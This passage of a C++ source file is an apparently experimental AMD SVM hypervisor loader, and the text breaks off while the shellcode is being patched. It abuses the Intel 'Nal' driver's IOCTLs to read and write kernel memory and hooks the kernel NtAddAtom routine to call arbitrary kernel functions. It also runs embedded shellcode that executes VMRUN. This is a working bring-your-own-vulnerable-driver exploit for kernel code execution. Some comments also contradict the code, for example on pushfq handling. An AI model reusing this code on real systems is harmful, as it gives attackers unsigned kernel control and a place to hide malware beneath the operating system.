Ìğ// SVMHypervisorV6_4.cpp
// Step 6.4 FIXED: Exit-Driven Loop with Proper ABI
//
// CRITICAL FIXES:
// 1. Stack alignment: 7 pushes for 16-byte alignment (RSP % 16 == 8)
// 2. RFLAGS saved/restored properly with pushfq/popfq
// 3. Use R13 for VMCB_VA instead of RBX (RBX is callee-saved problem)
// 4. Clean interrupt state handling
//
// Return value:
//   Low 16 bits:  CPUID count
//   Bits 16-23:   Termination code
//   Bits 24-31:   Exit reason

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007

typedef struct _COPY_MEMORY_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} COPY_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} GET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} MAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t reserved2;
  uint64_t virt_address;
  uint64_t reserved3;
  uint32_t number_of_bytes;
} UNMAP_IO_SPACE_BUFFER_INFO;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;

bool MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
  COPY_MEMORY_BUFFER_INFO info = {0};
  info.case_number = 0x33;
  info.source = src;
  info.destination = dest;
  info.length = size;
  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool ReadMemory(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy((uint64_t)pinnedBuffer, address, size);
  if (result)
    memcpy(buffer, pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool WriteMemory(uint64_t address, void *buffer, uint64_t size) {
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy(address, (uint64_t)pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool GetPhysicalAddress(uint64_t address, uint64_t *outPhys) {
  GET_PHYS_ADDRESS_BUFFER_INFO info = {0};
  info.case_number = 0x25;
  info.address_to_translate = address;
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return false;
  *outPhys = info.return_physical_address;
  return true;
}

uint64_t MapIoSpace(uint64_t physAddr, uint32_t size) {
  MAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x19;
  info.physical_address_to_map = physAddr;
  info.size = size;
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return 0;
  return info.return_virtual_address;
}

bool UnmapIoSpace(uint64_t virtAddr, uint32_t size) {
  UNMAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x1A;
  info.virt_address = virtAddr;
  info.number_of_bytes = size;
  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool WriteToReadOnlyMemory(uint64_t address, void *buffer, uint32_t size) {
  uint64_t physAddr = 0;
  if (!GetPhysicalAddress(address, &physAddr) || physAddr == 0)
    return false;
  uint64_t mappedAddr = MapIoSpace(physAddr, size);
  if (!mappedAddr)
    return false;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer) {
    UnmapIoSpace(mappedAddr, size);
    return false;
  }
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy(mappedAddr, (uint64_t)pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  UnmapIoSpace(mappedAddr, size);
  return result;
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;
  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }
  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;
  if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;
  if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                  sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;
  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;
  uint32_t readSize = (exportSize < 0x40000) ? exportSize : 0x40000;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;
  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000) ? (readSize - offset) : 0x1000;
    ReadMemory(moduleBase + exportRva + offset, exportData + offset, chunkSize);
  }
  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;
  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }
  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);
  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;
    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }
  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

uint8_t kernel_injected_jmp[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];

template <typename RetType, typename... Args>
bool CallKernelFunction(RetType *outResult, uint64_t targetFuncAddr,
                        Args... args) {
  if (!targetFuncAddr || !kernelNtAddAtom)
    return false;
  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(original_kernel_function)))
    return false;
  if (original_kernel_function[0] == 0x48 &&
      original_kernel_function[1] == 0xb8)
    return false;
  uint8_t jmpHook[sizeof(kernel_injected_jmp)];
  memcpy(jmpHook, kernel_injected_jmp, sizeof(jmpHook));
  *(uint64_t *)&jmpHook[2] = targetFuncAddr;
  if (!WriteToReadOnlyMemory(kernelNtAddAtom, jmpHook, sizeof(jmpHook)))
    return false;
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomPtr = reinterpret_cast<RetType(__stdcall *)(Args...)>(
      GetProcAddress(ntdll, "NtAddAtom"));
  RetType result = NtAddAtomPtr(args...);
  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(original_kernel_function));
  if (outResult)
    *outResult = result;
  return true;
}

// ==================== V6.4 FIXED Shellcode ====================
// FIXES:
// 1. Proper stack alignment (sub rsp, 8 for 16-byte alignment)
// 2. pushfq before CLI, popfq after STGI
// 3. Use R13 for VMCB_VA (not RBX)
// 4. R14 = VMCB_PA, R15 = saved RFLAGS
//
// Registers:
// - R13 = VMCB_VA (virtual address for reading VMCB fields)
// - R14 = VMCB_PA (physical address for vmload/vmrun)
// - R12 = CPUID counter
// - R11 = exit reason
// - R10 = termination code
// - R8  = watchdog counter

uint8_t v6_4Shellcode[] = {
    // ===== Prologue with proper alignment =====
    0x55, // push rbp
    0x48,
    0x89,
    0xE5, // mov rbp, rsp
    0x48,
    0x83,
    0xEC,
    0x08, // sub rsp, 8 (alignment!)
    0x41,
    0x57, // push r15
    0x41,
    0x56, // push r14
    0x41,
    0x55, // push r13
    0x41,
    0x54, // push r12
    0x53, // push rbx
    // NO pushfq here - RFLAGS handled by CLI/STGI only!

    // ===== Enable SVME =====
    0xB9,
    0x80,
    0x00,
    0x00,
    0xC0, // mov ecx, 0xC0000080
    0x0F,
    0x32, // rdmsr
    0x0D,
    0x00,
    0x10,
    0x00,
    0x00, // or eax, 0x1000
    0x0F,
    0x30, // wrmsr

    // ===== VM_HSAVE_PA =====
    0xB9,
    0x17,
    0x01,
    0x01,
    0xC0, // mov ecx, 0xC0010117
    0xB8,
    0x00,
    0x00,
    0x00,
    0x00, // @HSAVE_LOW
    0xBA,
    0x00,
    0x00,
    0x00,
    0x00, // @HSAVE_HIGH
    0x0F,
    0x30, // wrmsr

    // ===== Load pointers (R13 = VA, R14 = PA) =====
    0x49,
    0xBD,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov r13, vmcb_va @VMCB_VA
    0x49,
    0xBE,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov r14, vmcb_pa @VMCB_PA

    // ===== VMSAVE host state =====
    0x4C,
    0x89,
    0xF0, // mov rax, r14
    0x0F,
    0x01,
    0xDB, // vmsave

    // ===== Populate VMCB (using R13 as VMCB_VA) =====
    // CR0
    0x0F,
    0x20,
    0xC0, // mov rax, cr0
    0x49,
    0x89,
    0x85,
    0x58,
    0x05,
    0x00,
    0x00, // mov [r13+0x558], rax
    // CR3
    0x0F,
    0x20,
    0xD8, // mov rax, cr3
    0x49,
    0x89,
    0x85,
    0x50,
    0x05,
    0x00,
    0x00, // mov [r13+0x550], rax
    // CR4
    0x0F,
    0x20,
    0xE0, // mov rax, cr4
    0x49,
    0x89,
    0x85,
    0x48,
    0x05,
    0x00,
    0x00, // mov [r13+0x548], rax
    // EFER - CRITICAL: Guest must have LMA=0, LME=1!
    // AMD SVM sets LMA on entry, guest must NOT have LMA=1!
    0xB9,
    0x80,
    0x00,
    0x00,
    0xC0, // mov ecx, 0xC0000080
    0x0F,
    0x32, // rdmsr (host EFER)
    0x48,
    0xC1,
    0xE2,
    0x20, // shl rdx, 32
    0x48,
    0x09,
    0xD0, // or rax, rdx
    // CLEAR LMA (bit 10)! Guest must have LMA=0!
    0x48,
    0x25,
    0xFF,
    0xFB,
    0xFF,
    0xFF, // and rax, 0xFFFFFBFF (clear bit 10)
    0x49,
    0x89,
    0x85,
    0xD0,
    0x04,
    0x00,
    0x00, // mov [r13+0x4D0], rax
    // GDTR
    0x48,
    0x83,
    0xEC,
    0x10,
    0x0F,
    0x01,
    0x04,
    0x24,
    0x0F,
    0xB7,
    0x04,
    0x24,
    0x41,
    0x89,
    0x85,
    0x64,
    0x04,
    0x00,
    0x00,
    0x48,
    0x8B,
    0x44,
    0x24,
    0x02,
    0x49,
    0x89,
    0x85,
    0x68,
    0x04,
    0x00,
    0x00,
    // IDTR
    0x0F,
    0x01,
    0x0C,
    0x24,
    0x0F,
    0xB7,
    0x04,
    0x24,
    0x41,
    0x89,
    0x85,
    0x84,
    0x04,
    0x00,
    0x00,
    0x48,
    0x8B,
    0x44,
    0x24,
    0x02,
    0x49,
    0x89,
    0x85,
    0x88,
    0x04,
    0x00,
    0x00,
    0x48,
    0x83,
    0xC4,
    0x10,
    // Segments (using R13)
    0x8C,
    0xC8,
    0x66,
    0x41,
    0x89,
    0x85,
    0x10,
    0x04,
    0x00,
    0x00, // CS
    0x8C,
    0xD0,
    0x66,
    0x41,
    0x89,
    0x85,
    0x20,
    0x04,
    0x00,
    0x00, // SS
    0x8C,
    0xD8,
    0x66,
    0x41,
    0x89,
    0x85,
    0x30,
    0x04,
    0x00,
    0x00, // DS
    0x8C,
    0xC0,
    0x66,
    0x41,
    0x89,
    0x85,
    0x00,
    0x04,
    0x00,
    0x00, // ES

    // ===== Set CPL = 0 (VMCB offset 0xCB) - MANDATORY for AMD SVM! =====
    0x41,
    0xC6,
    0x85,
    0xCB,
    0x00,
    0x00,
    0x00,
    0x00, // mov byte [r13+0xCB], 0 - CPL must match CS.DPL!

    // ===== TR (Task Register) - MANDATORY on AMD SVM! =====
    // Without TR, AMD rejects entry with 0xFF!
    // TR selector at VMCB+0x40
    0x66,
    0x41,
    0xC7,
    0x85,
    0x40,
    0x00,
    0x00,
    0x00,
    0x40,
    0x00, // mov word [r13+0x40], 0x40 (kernel TSS selector)
    // TR limit at VMCB+0x44
    0x41,
    0xC7,
    0x85,
    0x44,
    0x00,
    0x00,
    0x00,
    0x67,
    0x00,
    0x00,
    0x00, // mov dword [r13+0x44], 0x67 (standard TSS limit)
    // TR attributes at VMCB+0x46 = 0x008B (Present | Busy | Type=0xB)
    0x66,
    0x41,
    0xC7,
    0x85,
    0x46,
    0x00,
    0x00,
    0x00,
    0x8B,
    0x00, // mov word [r13+0x46], 0x008B
    // TR base at VMCB+0x50 - use current host TR base (read via STR + GDT)
    // For simplicity, use 0 (guest will never actually use it)
    0x49,
    0xC7,
    0x85,
    0x50,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov qword [r13+0x50], 0

    // Segment limits
    0xB8,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0x41,
    0x89,
    0x85,
    0x04,
    0x04,
    0x00,
    0x00,
    0x41,
    0x89,
    0x85,
    0x14,
    0x04,
    0x00,
    0x00,
    0x41,
    0x89,
    0x85,
    0x24,
    0x04,
    0x00,
    0x00,
    0x41,
    0x89,
    0x85,
    0x34,
    0x04,
    0x00,
    0x00,
    // Segment attributes
    // CS: 0x0A9B = L=1 for LONG MODE (AMD SVM REQUIRES THIS!)
    // AMD SVM does NOT derive CS.L from EFER like Intel VMX!
    0x66,
    0x41,
    0xC7,
    0x85,
    0x12,
    0x04,
    0x00,
    0x00,
    0x9B,
    0x0A, // 0x0A9B - CS.L=1 for AMD SVM long mode!
    0x66,
    0x41,
    0xC7,
    0x85,
    0x22,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00,
    0x66,
    0x41,
    0xC7,
    0x85,
    0x32,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00,
    0x66,
    0x41,
    0xC7,
    0x85,
    0x02,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00,
    // RFLAGS - MUST have IF=1 for HLT to be legal!
    0x9C, // pushfq
    0x58, // pop rax
    0x0D,
    0x00,
    0x02,
    0x00,
    0x00, // or eax, 0x200 (set IF=1!)
    0x49,
    0x89,
    0x85,
    0x70,
    0x05,
    0x00,
    0x00, // mov [r13+0x570], rax
    // CRITICAL: Guest RSP MUST be guest-owned memory, NOT host stack!
    // Using host RSP causes INVALID GUEST STATE (exit code 0xFF)!
    0x48,
    0xB8,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov rax, guestStackTop @GUEST_STACK
    0x49,
    0x89,
    0x85,
    0xD8,
    0x05,
    0x00,
    0x00, // mov [r13+0x5D8], rax
    // ASID = 1 (offset 0x58) - same as V6.1
    0x41,
    0xC7,
    0x45,
    0x58,
    0x01,
    0x00,
    0x00,
    0x00,

    // ===== Intercepts: CPUID ONLY (HLT naturally VMEXITs!) =====
    // NOTE: 0x01040000 is WRONG! HLT is bit 7 (0x80), not bit 24!
    0x41,
    0xC7,
    0x45,
    0x0C,
    0x00,
    0x00,
    0x04,
    0x00, // mov dword [r13+0x0C], 0x00040000 - CPUID ONLY!
    0x41,
    0xC7,
    0x45,
    0x10,
    0x00, // NO VMRUN intercept!
    0x00,
    0x00,
    0x00, // mov dword [r13+0x10], 0x00000000

    // ===== CRITICAL: Clear VMCB Clean Bits! =====
    // Without this, CPU uses CACHED control fields and ignores our changes!
    0x41,
    0xC7,
    0x85,
    0xC0,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov dword [r13+0xC0], 0x00000000 - CLEAR ALL CLEAN BITS!

    // ===== Set guest RIP =====
    0x48,
    0x8D,
    0x05,
    0x00,
    0x00,
    0x00,
    0x00, // lea rax, [rip+XX] @LEA_DISP
    0x49,
    0x89,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00, // mov [r13+0x578], rax

    // ===== Guest RAX = 1 =====
    0x49,
    0xC7,
    0x85,
    0xF8,
    0x05,
    0x00,
    0x00,
    0x01,
    0x00,
    0x00,
    0x00,

    // ===== Initialize counter =====
    0x45,
    0x31,
    0xE4, // xor r12d, r12d (cpuid count = 0)

    // ========================================
    // ITERATION 1 - First VMRUN
    // ========================================
    0x4C,
    0x89,
    0xF0, // mov rax, r14
    0xFA, // cli
    0x0F,
    0x01,
    0xDA, // vmload
    0x0F,
    0x01,
    0xD8, // vmrun
    0x0F,
    0x01,
    0xDB, // vmsave
    0x0F,
    0x01,
    0xDC, // stgi (NO sti - stgi handles interrupt enable!)
    // Increment counter
    0x41,
    0xFF,
    0xC4, // inc r12d
    // CPUID emulation: set ECX bit 31 (hypervisor present!)
    0xB8,
    0x01,
    0x00,
    0x00,
    0x00, // mov eax, 1
    0x31,
    0xC9, // xor ecx, ecx
    0x0F,
    0xA2, // cpuid
    0x0F,
    0xBA,
    0xE9,
    0x1F, // bts ecx, 31 (SET HYPERVISOR BIT!)
    // Advance guest RIP by 2 (CPUID is 2 bytes)
    0x49,
    0x8B,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00, // mov rax, [r13+0x578]
    0x48,
    0x83,
    0xC0,
    0x02, // add rax, 2
    0x49,
    0x89,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00, // mov [r13+0x578], rax

    // ===== MUST clear clean bits after RIP modification! =====
    0x41,
    0xC7,
    0x85,
    0xC0,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov dword [r13+0xC0], 0
    // ========================================
    // ITERATION 2 - Second VMRUN
    // ========================================
    0x4C,
    0x89,
    0xF0, // mov rax, r14
    0xFA, // cli
    0x0F,
    0x01,
    0xDA, // vmload
    0x0F,
    0x01,
    0xD8, // vmrun
    0x0F,
    0x01,
    0xDB, // vmsave
    0x0F,
    0x01,
    0xDC, // stgi (NO sti!)
    // Increment counter
    0x41,
    0xFF,
    0xC4, // inc r12d
    // CPUID emulation
    0xB8,
    0x01,
    0x00,
    0x00,
    0x00, // mov eax, 1
    0x31,
    0xC9, // xor ecx, ecx
    0x0F,
    0xA2, // cpuid
    0x0F,
    0xBA,
    0xE9,
    0x1F, // bts ecx, 31
    // Advance RIP
    0x49,
    0x8B,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00, // mov rax, [r13+0x578]
    0x48,
    0x83,
    0xC0,
    0x02, // add rax, 2
    0x49,
    0x89,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00, // mov [r13+0x578], rax

    // ===== MUST clear clean bits after RIP modification! =====
    0x41,
    0xC7,
    0x85,
    0xC0,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov dword [r13+0xC0], 0
    // ========================================
    // ITERATION 3 - Third VMRUN
    // ========================================
    0x4C,
    0x89,
    0xF0, // mov rax, r14
    0xFA, // cli
    0x0F,
    0x01,
    0xDA, // vmload
    0x0F,
    0x01,
    0xD8, // vmrun
    0x0F,
    0x01,
    0xDB, // vmsave
    0x0F,
    0x01,
    0xDC, // stgi (NO sti!)
    // Increment counter
    0x41,
    0xFF,
    0xC4, // inc r12d
    // CPUID emulation
    0xB8,
    0x01,
    0x00,
    0x00,
    0x00, // mov eax, 1
    0x31,
    0xC9, // xor ecx, ecx
    0x0F,
    0xA2, // cpuid
    0x0F,
    0xBA,
    0xE9,
    0x1F, // bts ecx, 31

    // ===== Advance RIP after 3rd CPUID (CRITICAL!) =====
    0x49,
    0x8B,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00, // mov rax, [r13+0x578]
    0x48,
    0x83,
    0xC0,
    0x02, // add rax, 2
    0x49,
    0x89,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00, // mov [r13+0x578], rax

    // ===== MUST clear clean bits after RIP modification! =====
    0x41,
    0xC7,
    0x85,
    0xC0,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // mov dword [r13+0xC0], 0
    // ========================================
    // ITERATION 4 - Execute HLT (no intercept needed!)
    // HLT naturally causes VMEXIT on AMD SVM
    // NOTE: NO CLI here! GIF must remain 1 because guest IF=1
    // ========================================
    0x4C,
    0x89,
    0xF0, // mov rax, r14
    // NO CLI! GIF already 1 from previous stgi, guest IF=1 requires GIF=1
    0x0F,
    0x01,
    0xDA, // vmload
    0x0F,
    0x01,
    0xD8, // vmrun -> guest executes HLT -> VMEXIT 0x78!
    0x0F,
    0x01,
    0xDB, // vmsave
    0x0F,
    0x01,
    0xDC, // stgi

    // ===== Get HLT exit reason from VMCB (should be 0x78!) =====
    // EXITCODE is 16-bit at VMCB+0x70, NOT 32-bit!
    0x41,
    0x0F,
    0xB7,
    0x45,
    0x70, // movzx eax, word [r13+0x70] - READ AS 16-BIT!
    0x41,
    0x89,
    0xC3, // mov r11d, eax - save to r11d

    // Return: (exit_reason << 24) | cpuid_count
    0x44,
    0x89,
    0xD8, // mov eax, r11d
    0xC1,
    0xE0,
    0x18, // shl eax, 24
    0x44,
    0x09,
    0xE0, // or eax, r12d

    // ===== Epilogue =====
    0x5B, // pop rbx
    0x41,
    0x5C, // pop r12
    0x41,
    0x5D, // pop r13
    0x41,
    0x5E, // pop r14
    0x41,
    0x5F, // pop r15
    0x48,
    0x83,
    0xC4,
    0x08, // add rsp, 8
    0x5D, // pop rbp
    0xC3, // ret

    // ===== Guest code (3 CPUIDs + HLT) =====
    0x0F,
    0xA2, // cpuid #1
    0x0F,
    0xA2, // cpuid #2
    0x0F,
    0xA2, // cpuid #3
    0xF4, // HLT -> natural VMEXIT 0x78!
};

#define GUEST_CODE_SIZE 7 // 3 CPUIDs (6 bytes) + HLT (1 byte)

int main() {
  printf("================================================================\n");
  printf("  SVM HYPERVISOR V6.4 - 3 Iteration Bounded Loop + CPUID Emu   \n");
  printf("    - 3 VMRUN/VMEXIT cycles                                    \n");
  printf("    - CPUID emulation: ECX bit 31 = HYPERVISOR PRESENT!        \n");
  printf("    - V6.1-style conservative approach                         \n");
  printf(
      "================================================================\n\n");

  size_t shellcodeSize = sizeof(v6_4Shellcode);
  size_t guestCodeOffset = shellcodeSize - GUEST_CODE_SIZE;

  printf("[*] Shellcode size: %zu bytes\n", shellcodeSize);
  printf("[*] Guest code at offset: %zu\n\n", guestCodeOffset);

  // Find patch locations
  size_t OFF_HSAVE_LOW = 0, OFF_HSAVE_HIGH = 0;
  size_t OFF_VMCB_VA = 0, OFF_VMCB_PA = 0;
  size_t OFF_GUEST_STACK = 0;
  size_t OFF_LEA_DISP = 0;

  // Find HSAVE (B8 followed by BA)
  for (size_t i = 0; i < shellcodeSize - 10; i++) {
    if (v6_4Shellcode[i] == 0xB8 && v6_4Shellcode[i + 5] == 0xBA) {
      OFF_HSAVE_LOW = i + 1;
      OFF_HSAVE_HIGH = i + 6;
      break;
    }
  }

  // Find mov r13, imm64 (49 BD)
  for (size_t i = 0; i < shellcodeSize - 10; i++) {
    if (v6_4Shellcode[i] == 0x49 && v6_4Shellcode[i + 1] == 0xBD) {
      OFF_VMCB_VA = i + 2;
      break;
    }
  }

  // Find mov r14, imm64 (49 BE)
  for (size_t i = 0; i < shellcodeSize - 10; i++) {
    if (v6_4Shellcode[i] == 0x49 && v6_4Shellcode[i + 1] == 0xBE) {
      OFF_VMCB_PA = i + 2;
      break;
    }
  }

  // Find guest stack (48 B8) - first mov rax, imm64 for RSP
  for (size_t i = 0; i < shellcodeSize - 10; i++) {
    if (v6_4Shellcode[i] == 0x48 && v6_4Shellcode[i + 1] == 0xB8 &&
        v6_4Shellcode[i + 10] == 0x49 && v6_4Shellcode[i + 11] == 0x89 &&
        v6_4Shellcode[i + 12] == 0x85 && v6_4Shellcode[i + 13] == 0xD8) {
      OFF_GUEST_STACK = i + 2;
      break;
    }
  }

  // Find LEA (48 8D 05)
  for (size_t i = 0; i < shellcodeSize - 10; i++) {
    if (v6_4Shellcode[i] == 0x48 && v6_4Shellcode[i + 1] == 0x8D &&
        v6_4Shellcode[i + 2] == 0x05) {
      OFF_LEA_DISP = i + 3;
      break;
    }
  }

  printf("[*] Offsets: HSAVE_LOW=%zu, HSAVE_HIGH=%zu\n", OFF_HSAVE_LOW,
         OFF_HSAVE_HIGH);
  printf("[*] Offsets: VMCB_VA=%zu, VMCB_PA=%zu\n", OFF_VMCB_VA, OFF_VMCB_PA);
  printf("[*] Offsets: GUEST_STACK=%zu, LEA_DISP=%zu\n\n", OFF_GUEST_STACK,
         OFF_LEA_DISP);

  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not found!\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  uint64_t kernelExAllocatePool =
      GetKernelExport(ntoskrnlBase, "ExAllocatePoolWithTag");

  uint64_t allocatedAddr = 0;
  CallKernelFunction<uint64_t>(&allocatedAddr, kernelExAllocatePool, 0, 0x3000,
                               0x484D5653); // Increased to 0x3000!
  if (!allocatedAddr) {
    printf("[-] Allocation failed!\n");
    CloseHandle(hDevice);
    return 1;
  }

  uint64_t vmcbVa = allocatedAddr;
  uint64_t hsaveVa = allocatedAddr + 0x1000;
  uint64_t guestStackTop =
      allocatedAddr + 0x3000 - 0x10; // GUEST PRIVATE STACK!
  uint64_t vmcbPa = 0, hsavePa = 0;
  GetPhysicalAddress(vmcbVa, &vmcbPa);
  GetPhysicalAddress(hsaveVa, &hsavePa);
  printf("[+] VMCB: VA=0x%llX PA=0x%llX\n", vmcbVa, vmcbPa);
  printf("[+] HSAVE: VA=0x%llX PA=0x%llX\n", hsaveVa, hsavePa);
  printf("[+] Guest Stack Top: 0x%llX\n", guestStackTop);

  uint8_t zeros[0x1000] = {0};
  WriteMemory(vmcbVa, zeros, 0x1000);
  WriteMemory(hsaveVa, zeros, 0x1000);
  WriteMemory(allocatedAddr + 0x2000, zeros, 0x1000); // Clear guest stack

  // Patch shellcode
  uint8_t patched[sizeof(v6_4Shellcode)];
  memcpy(patched, v6_4Shellcode, sizeof(patched));

